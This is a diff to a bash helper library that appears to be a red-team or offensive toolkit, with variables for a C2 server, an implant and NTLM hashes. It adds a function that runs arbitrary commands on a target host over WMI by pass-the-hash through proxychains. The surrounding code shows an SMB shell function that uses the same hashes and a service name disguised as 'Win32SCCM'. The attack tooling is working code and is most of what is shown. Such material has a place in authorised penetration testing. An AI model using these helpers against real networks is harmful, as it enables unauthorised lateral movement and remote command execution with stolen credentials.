@@ -13,6 +13,7 @@ export HASH='';
 export HASHES='';
 export C2SERVER='';
 export IMPLANT='';
+export PHRASE='';
 
 # SECTION: General helper functions:
 
@@ -812,6 +813,26 @@ function smbShell(){
             -no-pass -hashes $HASHES \
             -service-name Win32SCCM \
             -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    fi
+    return;
+}
+
+function wmiCommandOutput(){
+    # DESCRIPTION: Execute WMI command without output on target system.
+    # ARGUMENT: TARGET, COMMAND.
+    TARGET=$1;
+    COMMAND=$2;
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            wmiexec.py \
+            -no-pass -hashes $HASHES \
+            ${USER}@${TARGET} "${COMMAND}";
+    else
+          proxychains \
+            wmiexec.py \
+            -no-pass -hashes $HASHES \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
     fi
     return;
 }
